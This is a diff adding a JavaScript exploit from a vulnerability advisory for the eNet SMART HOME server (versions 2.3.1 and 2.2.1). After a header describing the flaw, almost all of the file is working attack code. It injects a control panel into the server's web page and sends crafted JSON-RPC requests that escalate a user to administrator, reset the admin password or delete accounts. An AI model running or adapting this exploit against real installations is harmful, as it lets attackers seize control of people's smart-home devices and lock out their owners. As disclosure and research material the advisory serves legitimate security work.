@@ -1,0 +1,391 @@
+/*
+
+eNet SMART HOME server 2.3.1 (setUserGroup) Remote Privilege Escalation
+
+
+Vendor: Gira Giersiepen GmbH & Co. KG | ALBRECHT JUNG GmbH & Co. KG | Insta GmbH
+Product web page: https://www.enet-smarthome.com
+Affected version: 2.3.1 (46841)
+                  2.2.1 (46056)
+
+Summary: Two German specialists in building systems technology are jointly bringing
+a new, wireless-based smart home system to the market. Gira and JUNG are the companies
+behind the eNet SMART HOME brand with our subsidiary, INSTA, responsible for developing
+the system. All three of us are old hands when it comes to building automation, and
+have a history of connecting buildings in an intelligent way that goes back as far as
+the 80s. Gira, JUNG and INSTA were part of the group of companies that initiated and
+founded EIBA (now known as KNX). KNX is the first open global standard for home and
+building automation. Through KNX, we have decisively shaped the development of intelligent
+building systems technology – and this wealth of experience has now come together in
+eNet SMART HOME. The eNet server is the heart of every eNet SMART HOME system and
+offers end customers the basis for an easy-to-use and secure Smart Home and installation
+engineers easily understandable and professional commissioning of the system.
+
+Desc: The eNet Smart Home system suffers from a privilege escalation vulnerability due
+to insufficient authorization checks in the JSON-RPC endpoint for user management. A
+low-privileged user, can exploit the "setUserGroup" method by sending a crafted POST
+request to /jsonrpc/management, specifying their own username and elevating it to the
+"UG_ADMIN" group. This bypasses intended access controls, granting the attacker administrative
+capabilities such as modifying device configurations, network settings, and potentially
+compromising the entire smart home ecosystem.
+
+Tested on: GNU/Linux 4.4.15 (ARMv7 revision 5)
+           Jetty(9.2.z-SNAPSHOT)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-5975
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2026-5975.php
+
+
+07.02.2026
+
+*/
+
+
+const existingContainer = document.getElementById('exploitSnippet');
+if (existingContainer) existingContainer.remove();
+
+const currentProtocol = window.location.protocol.slice(0, -1);
+const currentHost = window.location.hostname;
+const currentPort = window.location.port || (currentProtocol === 'https' ? '443' : '80');
+
+const urlParams = new URLSearchParams(window.location.search);
+let defaultIcp = urlParams.get('icp') || '';
+
+const formHtml = `
+<div id="exploitSnippet"
+     style="position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 320px;
+            background: #2f343a;
+            color: #e4e7eb;
+            padding: 20px;
+            border: 1px solid #4a5560;
+            border-radius: 8px;
+            z-index: 9999;
+            overflow-y: auto;
+            max-height: 80vh;
+            font-family: Arial, sans-serif;
+            font-size: 14px;">
+
+  <h3 style="margin-top: 0;
+             color: #cfd8e3;">
+    eNet SMART HOME - DRE Exploit
+  </h3>
+
+  <label>Protocol:</label>
+  <select id="protocol"
+          style="width: 100%;
+                 margin-bottom: 12px;
+                 background: #3b4148;
+                 color: #e4e7eb;
+                 border: 1px solid #56606b;
+                 border-radius: 4px;
+                 padding: 6px;">
+    <option value="https"
+            ${currentProtocol === 'https' ? 'selected' : ''}>
+      https://
+    </option>
+    <option value="http"
+            ${currentProtocol === 'http' ? 'selected' : ''}>
+      http://
+    </option>
+  </select>
+
+  <label>Host/IP:</label>
+  <input type="text"
+         id="host"
+         value="${currentHost}"
+         style="width: 100%;
+                margin-bottom: 12px;
+                background: #3b4148;
+                color: #e4e7eb;
+                border: 1px solid #56606b;
+                border-radius: 4px;
+                padding: 6px;">
+
+  <label>Port:</label>
+  <input type="text"
+         id="port"
+         value="${currentPort}"
+         style="width: 100%;
+                margin-bottom: 12px;
+                background: #3b4148;
+                color: #e4e7eb;
+                border: 1px solid #56606b;
+                border-radius: 4px;
+                padding: 6px;">
+
+  <label>ICP:</label>
+  <input type="text"
+         id="icp"
+         value="${defaultIcp}"
+         style="width: 100%;
+                margin-bottom: 12px;
+                background: #3b4148;
+                color: #e4e7eb;
+                border: 1px solid #56606b;
+                border-radius: 4px;
+                padding: 6px;">
+
+  <label>Action:</label>
+  <select id="action"
+          style="width: 100%;
+                 margin-bottom: 12px;
+                 background: #3b4148;
+                 color: #e4e7eb;
+                 border: 1px solid #56606b;
+                 border-radius: 4px;
+                 padding: 6px;">
+    <option value="elevate">Elevate Privileges</option>
+    <option value="reset">Reset Password</option>
+    <option value="delete">Delete User</option>
+  </select>
+
+  <div id="elevateFields">
+    <label>User Name:</label>
+    <input type="text"
+           id="userName"
+           value="zeroscience"
+           style="width: 100%;
+                  margin-bottom: 12px;
+                  background: #3b4148;
+                  color: #e4e7eb;
+                  border: 1px solid #56606b;
+                  border-radius: 4px;
+                  padding: 6px;">
+
+    <label>User Group:</label>
+    <select id="userGroup"
+            style="width: 100%;
+                   margin-bottom: 12px;
+                   background: #3b4148;
+                   color: #e4e7eb;
+                   border: 1px solid #56606b;
+                   border-radius: 4px;
+                   padding: 6px;">
+      <option value="UG_USER">UG_USER (lower privs)</option>
+      <option value="UG_ADMIN">UG_ADMIN</option>
+    </select>
+  </div>
+
+  <div id="resetFields" style="display: none;">
+    <label>User Name:</label>
+    <input type="text"
+           id="resetUserName"
+           value="admin"
+           style="width: 100%;
+                  margin-bottom: 12px;
+                  background: #3b4148;
+                  color: #e4e7eb;
+                  border: 1px solid #56606b;
+                  border-radius: 4px;
+                  padding: 6px;">
+
+    <label>Default Password:</label>
+    <input type="text"
+           id="defaultPassword"
+           value="12345678"
+           style="width: 100%;
+                  margin-bottom: 12px;
+                  background: #3b4148;
+                  color: #e4e7eb;
+                  border: 1px solid #56606b;
+                  border-radius: 4px;
+                  padding: 6px;">
+  </div>
+
+  <div id="deleteFields" style="display: none;">
+    <label>User Name:</label>
+    <input type="text"
+           id="deleteUserName"
+           value="zeroscience"
+           style="width: 100%;
+                  margin-bottom: 12px;
+                  background: #3b4148;
+                  color: #e4e7eb;
+                  border: 1px solid #56606b;
+                  border-radius: 4px;
+                  padding: 6px;">
+  </div>
+
+  <label>Request ID:</label>
+  <input type="text"
+         id="requestId"
+         value="14"
+         style="width: 100%;
+                margin-bottom: 12px;
+                background: #3b4148;
+                color: #e4e7eb;
+                border: 1px solid #56606b;
+                border-radius: 4px;
+                padding: 6px;">
+
+  <button id="runButton"
+          type="button"
+          style="background: #3a6ea5;
+                 color: #ffffff;
+                 border: 1px solid #2e5d8c;
+                 padding: 8px 16px;
+                 border-radius: 4px;
+                 cursor: pointer;
+                 margin-right: 10px;">
+    RUN
+  </button>
+
+  <button id="closeButton"
+          type="button"
+          style="background: #5c6773;
+                 color: #ffffff;
+                 border: 1px solid #49525c;
+                 padding: 8px 16px;
+                 border-radius: 4px;
+                 cursor: pointer;">
+    Close
+  </button>
+
+  <div id="responseOutput"
+       style="margin-top: 12px;
+              white-space: pre-wrap;
+              background: #252a30;
+              color: #d6dde5;
+              padding: 10px;
+              border: 1px solid #4a5560;
+              border-radius: 4px;
+              max-height: 200px;
+              overflow-y: auto;">
+  </div>
+
+</div>
+`;
+
+document.body.insertAdjacentHTML('beforeend', formHtml);
+
+const actionSelect = document.getElementById('action');
+const runButton = document.getElementById('runButton');
+const closeButton = document.getElementById('closeButton');
+const responseOutput = document.getElementById('responseOutput');
+const elevateFields = document.getElementById('elevateFields');
+const resetFields = document.getElementById('resetFields');
+const deleteFields = document.getElementById('deleteFields');
+const requestIdInput = document.getElementById('requestId');
+
+const updateFields = (value) => {
+  elevateFields.style.display = value === 'elevate' ? 'block' : 'none';
+  resetFields.style.display = value === 'reset' ? 'block' : 'none';
+  deleteFields.style.display = value === 'delete' ? 'block' : 'none';
+  
+  let defaultId = '14';
+  if (value === 'reset') defaultId = '15';
+  if (value === 'delete') defaultId = '6';
+  requestIdInput.value = defaultId;
+};
+
+actionSelect.addEventListener('change', (e) => updateFields(e.target.value));
+
+updateFields(actionSelect.value);
+
+runButton.addEventListener('click', () => {
+  const protocol = document.getElementById('protocol').value;
+  const host = document.getElementById('host').value;
+  const port = document.getElementById('port').value;
+  const icp = document.getElementById('icp').value;
+  const action = actionSelect.value;
+  const requestId = requestIdInput.value;
+
+  if (!icp) {
+    responseOutput.textContent = 'Error: ICP is required.';
+    console.error('ICP is required.');
+    return;
+  }
+
+  responseOutput.textContent = 'Loading...';
+
+  let method, params;
+  if (action === 'elevate') {
+    method = 'setUserGroup';
+    params = {
+      userName: document.getElementById('userName').value,
+      userGroup: document.getElementById('userGroup').value
+    };
+  } else if (action === 'reset') {
+    method = 'resetUserPassword';
+    params = {
+      userName: document.getElementById('resetUserName').value,
+      defaultPassword: document.getElementById('defaultPassword').value
+    };
+  } else if (action === 'delete') {
+    method = 'deleteUserAccount';
+    params = {
+      userName: document.getElementById('deleteUserName').value
+    };
+  }
+
+  const baseUrl = `${protocol}://${host}:${port}`;
+  const customReferer = `${baseUrl}/serverconfiguration.html?icp=${icp}#Usermanagement`;
+  const fetchUrl = `${baseUrl}/jsonrpc/management`;
+
+  const body = JSON.stringify({
+    "jsonrpc": "2.0",
+    "method": method,
+    "params": params,
+    "id": requestId
+  });
+
+  console.log('Sending request to:', fetchUrl);
+  console.log('With Referer:', customReferer);
+  console.log('Body:', body);
+
+  const timeoutPromise = new Promise((_, reject) => 
+    setTimeout(() => reject(new Error('Request timed out')), 10000)
+  );
+
+  Promise.race([timeoutPromise, fetch(fetchUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json; charset=utf-8',
+      'Accept-Encoding': 'gzip, deflate, br',
+      'Accept-Language': 'ku-MK,ku;j=1.7',
+      'Accept': '*/*'
+    },
+    body: body,
+    credentials: 'include',
+    referrer: customReferer,
+    referrerPolicy: 'unsafe-url'
+  })])
+  .then(response => {
+    if (response instanceof Error) throw response;
+    console.log('Response status:', response.status);
+    if (!response.ok) {
+      throw new Error(`HTTP error! Status: ${response.status}`);
+    }
+    return response.json();
+  })
+  .then(data => {
+    const successMsg = `Success: ${JSON.stringify(data, null, 2)}`;
+    responseOutput.textContent = successMsg;
+    console.log(successMsg);
+    setTimeout(() => location.reload(), 2000);
+  })
+  .catch(error => {
+    const errorMsg = `Error: ${error.message}`;
+    responseOutput.textContent = errorMsg;
+    console.error(errorMsg);
+  });
+});
+
+closeButton.addEventListener('click', () => {
+  console.log('Closing form...');
+  const container = document.getElementById('exploitSnippet');
+  if (container) {
+    container.remove();
+    console.log('Form closed.');
+  } else {
+    console.log('Form not found.');
+  }
+});
